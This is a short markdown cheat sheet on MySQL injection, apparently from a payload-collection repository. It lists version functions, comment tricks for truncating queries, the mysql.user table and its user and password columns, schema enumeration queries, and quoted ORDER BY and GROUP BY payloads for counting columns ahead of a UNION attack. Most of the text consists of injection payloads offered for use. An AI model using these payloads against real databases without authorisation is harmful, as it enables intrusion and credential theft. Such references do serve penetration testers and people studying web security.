# MYSQL Injection

## Summary

* [MYSQL version](#mysql-version)
* [MYSQL Comment](#mysql-comment)
* [MYSQL Database Credentials](#mysql-Database_Credentials)
* [MYSQL Database Name](#mysql-Database_Name)
* [MYSQL Union Based](#mysql-union-based)
* [Detect columns number](#detect-columns-number)


## MYSQL version

```sql

VERSION()
@@VERSION
@@GLOBAL.VERSION

```

## MYSQL comment

```sql
#	Hash comment
/*      C-style comment
-- -	SQL comment
;%00	Nullbyte
`	Backtick
```

## MYSQL Database_Credentials

```sql
Table	mysql.user
Columns	user, password
Current User	user(), current_user(), current_user, system_user(), session_user()

Examples:
SELECT current_user;
```
## MYSQL Database_Name

```sql

Database Names
Tables	information_schema.schemata, mysql.db
Columns	schema_name, db
Current DB	database(), schema()

Examples:
SELECT database();
SELECT schema_name FROM information_schema.schemata;


```

## MYSQL Union Based

### Detect columns number

First you need to know the number of columns

##### Using `order by` or `group by`

Keep incrementing the number until you get a False response.
Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

```sql
1' ORDER BY 1--+	#True
1' ORDER BY 2--+	#True
1' ORDER BY 3--+	#True
1' ORDER BY 4--+	#False - Query is only using 3 columns
                       
```
or 
```sql
1' GROUP BY 1--+	#True
1' GROUP BY 2--+	#True
1' GROUP BY 3--+	#True
1' GROUP BY 4--+	#False - Query is only using 3 columns
                        
```
